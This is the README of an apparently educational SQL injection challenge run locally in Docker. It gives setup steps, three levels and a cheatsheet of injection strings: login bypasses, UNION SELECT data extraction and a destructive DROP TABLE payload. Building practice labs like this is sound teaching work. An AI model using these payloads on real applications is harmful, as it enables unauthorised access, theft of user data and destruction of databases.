# SQL Injection Challenge

A simple SQL injection challenge designed for educational purposes. Try to bypass the login system and extract sensitive data!

## Prerequisites
- Docker
- Docker Compose

## Setup Instructions
1. Clone this repository:

   git clone https://github.com/JKM1990/injection-challenge


2. Navigate to the project directory:

   cd Injection_challenge


3. Start the containers:

   docker-compose up -d


4. Access the challenge:

   Open your browser and visit `http://localhost:8080`

## The Challenge

Your mission, should you choose to accept it:

1. Level One: Try to log in without checking valid credentials from the database.
2. Level Two: Extract ALL user data from the database
3. Challenge Level: Find all admin accounts and their details

Once you have completed the challenge level, send a screenshot of the input you used including the successful feedback & data 
to w0194127@nscc.ca


### Tips
- Think about SQL syntax and special characters
- Remember that SQL queries can be manipulated
- Consider how login forms typically work with databases

## Extra Tips
- `#` can be more reliable than `--` as a comment
- The password field doesn't matter when using these injections
- Use single quotes `'` to break out of the SQL string
- The space at the end of injections is important when using `--`

## Common Errors & Fixes
- If getting syntax error with `--`, add a space after it
- If `--` doesn't work, try using `#` instead
- If UNION fails, make sure there's a space between UNION and SELECT

## Cheatsheet
Note: Adding a space after -- is crucial.
Note: Some of these commands are not relevant to this challenge.

'; DROP TABLE users;#
' UNION SELECT * FROM users;#
' OR username LIKE '%admin%' -- 
' ORDER BY 1,2,3 --
' UNION SELECT * FROM users -- 
'; DROP TABLE users;#
' OR '1'='1' -- 
' HAVING 1=1 -- 
' OR 'x'='x' -- 
' UNION SELECT * FROM users UNION SELECT * FROM users;#
' GROUP BY username HAVING 1=1 --
admin' -- 

## Good luck! 